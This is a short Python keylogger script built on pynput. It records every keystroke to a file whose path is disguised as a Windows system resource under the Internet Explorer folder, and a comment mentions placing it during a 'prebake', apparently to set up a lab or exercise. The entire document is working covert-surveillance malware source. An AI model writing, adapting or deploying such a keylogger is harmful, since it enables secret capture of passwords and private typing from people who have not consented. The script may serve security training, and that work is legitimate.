from pynput import keyboard

# Define the file to save the keystrokes
output_file = "C:\Program Files (x86)\Internet Explorer\en-Us\ielang.exe.mui" #FIND A PLACE FOR THIS DURING PREBAKE

def on_press(key):
    try:
        # Write the pressed key to the file
        with open(output_file, "a") as file:
            file.write(f'{key.char}')
    except AttributeError:
        # Write special keys to the file
        with open(output_file, "a") as file:
            if key == keyboard.Key.enter:
                file.write('\n') #Handle new lines
            if key == keyboard.Key.space:
                file.write(' ') #Handle backspaces
            if key == keyboard.Key.backspace:
                remove_last_character()
            else:
                pass

def on_release(key):
    pass

#Special handling for backspace
def remove_last_character():
    with open(output_file, "r") as file:
        content = file.read()
    content = content[:-1]
    with open(output_file, "w") as file:
        file.write(content)



# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
